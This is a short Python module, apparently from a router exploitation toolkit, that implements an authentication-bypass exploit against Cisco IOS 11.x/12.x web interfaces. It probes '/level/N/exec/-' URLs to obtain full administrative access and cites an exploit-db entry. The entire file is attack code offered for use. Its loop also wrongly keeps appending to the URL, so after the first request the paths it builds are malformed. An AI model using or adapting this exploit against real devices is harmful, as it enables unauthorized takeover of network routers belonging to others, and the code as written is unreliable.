from ..router_vuln import RouterVuln
import util
import urllib

__router__ = 'Cisco IOS 11.x/12.x'
__vuln__='Full Admin'
class FullAdmin(RouterVuln):
	""" Exploit a remote admin vulnerability in Cisco IOS 11.x/12.x routers
		http://www.exploit-db.com/exploits/20975/
	"""

	def __init__(self):
		super(FullAdmin,self).__init__()

	def run(self):
		url = 'http://%s/level/'%(self.ip)
		for idx in range(16, 100):
			url += str(idx) + '/exec/-'
			response = urllib.urlopen(url).read()
			if '200 ok' in response.lower():
				util.Msg('Device vulnerable.  Connect to %s for admin'%(self.ip))
				return
		util.Msg('Device not vulnerable.')
		return
